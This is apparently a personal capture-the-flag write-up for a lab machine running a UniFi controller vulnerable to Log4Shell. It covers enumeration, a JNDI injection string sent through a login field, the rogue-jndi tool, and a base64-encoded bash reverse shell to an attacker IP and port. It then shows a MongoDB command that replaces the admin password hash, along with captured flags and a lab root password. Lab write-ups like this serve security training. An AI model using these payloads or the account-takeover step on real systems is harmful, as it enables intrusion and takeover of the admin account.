---
title: 'Unified:'
updated: 2023-02-05T02:04:17.0000000+00:00
created: 2023-02-04T17:32:50.0000000+00:00
---

BURP request:

We can edit the **remember** field then…
![image1](../../../../../_resources/image1-64.png)
This gives us the response:
![image2](../../../../../_resources/image2-49.png)
And capture it on tcpdump:
![image3](../../../../../_resources/image3-42.png)
Now we know that the system is vulnerable to attack, we can build a payload to get RCE.

We are going to use the **rogue-jndi** Java payload. Which gives us a reverse shell. We need **Maven and a JDK**:

JDK:
![image4](../../../../../_resources/image4-34.png)
Maven:
![image5](../../../../../_resources/image5-24.png)

Now we clone the Rouge-JNDI java app:
![image6](../../../../../_resources/image6-16.png)

Then we build the package using Maven:
![image7](../../../../../_resources/image7-13.png)
Finally, we are ready to host our malicious JDNI server:

First we create a payload, which will give us the reverse shell:
![image8](../../../../../_resources/image8-11.png)
echo 'bash -c bash -i \>&/dev/tcp/10.10.14.8/4444 0\>&1' \| base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0IDA+JjEK

Then we can start Rogue-JDNI:
![image9](../../../../../_resources/image9-10.png)
**YOU CANNOT PUT SPACES BETWEEN COMMAS INSIDE THE CURLY BRACES, THIS DOESN'T WORK FOR SOME VERSIONS OF JAVA.**

Next we start a netcat listener to listen on port 4444 and we intercept a post request and modify it.
![image10](../../../../../_resources/image10-8.png)

"\${jndi:ldap://10.10.14.8:1389/o=tomcat}"
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTgvOTAwMSAwPiYxCg==

We can check our shell and see:
![image11](../../../../../_resources/image11-7.png)

This means that once we get the output from the rogue server, we have a shell on our netcat listener:

**FOR THE LOVE OF GOD, DO NOT ADD SPACES TO THE JNDI COMMAND AT ANY POINT AND REMOVE ALL NEW LINE CHARACTERS:**
![image12](../../../../../_resources/image12-5.png)

Flags:

**User-flag:** 6ced1a6a89e666c0620cdb10262ba127
**Root-flag:** e50bc93c75b634e4b272d2f771c33681

**Getting root:**

1.  Go to settings -\> site
2.  Get the root plaintext password
    1.  NotACrackablePassword4U2022
3.  Log in over ssh
![image13](../../../../../_resources/image13-4.png)
\\

Enumeration:

Nmap scan:
![image14](../../../../../_resources/image14-4.png)

We get a **unrecognised service** - which is why my nmap search took years**:**
![image15](../../../../../_resources/image15-4.png)

Something http-related? It has HTML and CSS code within it.

We can also scan for scripts, which reveals a link to a UniFI network login page:
<https://10.129.106.59:8443/manage/account/login?redirect=%2Fmanage>
![image16](../../../../../_resources/image16-4.png)
We know what version the UniFI is running by looking at this log-in page:
![image17](../../../../../_resources/image17-4.png)

We now can search for exploits. Looking at the CVE database, we see that this system is vulnerable to:
[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)

We can use **tcpdump** or **wireshark** to look at traffic and we can look at the port 389 which is the default LDAP port. If we can control the log messages, we can get RCE.

Exploitation:

We can try using BURP to send modified requests and eventually exploit the system for RCE by sending a malicious file to the website to get a reverse shell.

Upon a log in request, we want to send a payload via the **remember** field, so we can identify a point that is weak to injection.

**JNDI -** Java Naming and Directory Interface API: This is responsible for making calls to an API that locates resources and other program objects. A resource in this case is a program object that provides connections to system, like databases.

**LDAP -** Lightweight Directory Access Protocol: This is an open, vendor-neutral application for accessing and maintain distributed directory information services over the internet, by default the it runs on **port 389.**

We can run tcpdump, to check network traffic over the LDAP port (389):
![image18](../../../../../_resources/image18-4.png)

- Tcpdump
  - This is wireshark but on the CLI.
- -I
  - Defines the interface (eth0, wlan, tun0).
- Port
  - Defines what port to listen to.

Privilege Escalation:
We can navigate to home/Michael/ to get the user flag:
![image19](../../../../../_resources/image19-3.png)

We now need to use MongoDB to get admin:
![image20](../../../../../_resources/image20-3.png)

Now we interact with mongoDB:
![image21](../../../../../_resources/image21-3.png)

This shows us a bunch of tables,
![image22](../../../../../_resources/image22-3.png)

His password is in shadow:
\$6\$Ry6Vdbs\$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.

But oh no its hashed!

The default name for mongoDB tables is ace.

Cracking the password:

Now that we have an admin password we need to break it. We can see that \$6\$ is the hash identifier, this means that it is SHA-512, The salt of this hash will change each time it is made.

We can just upload our own hash, we make our own password using mkpasswd:
![image23](../../../../../_resources/image23-3.png)

Then we update the current password with our new password:

mongo --port 27117 ace --eval 'db.admin.update({"\_id":ObjectId("61ce278f46e0fb0012d47ee4")},{\$set:{"x_shadow":"\$6\$wd2OGv4OWuEJRJxz\$CkB73qpg4yb1Hb91W7lOpfmxp83fwuYh/.xYT9YmDaF/zD.Z.vand3/uCJbfX575Jzk/.IugFkL2R3kFBTRT30"}})'

Now we check that it worked:
![image24](../../../../../_resources/image24-3.png)

And we can log in with administrator:admin
![image25](../../../../../_resources/image25-3.png)

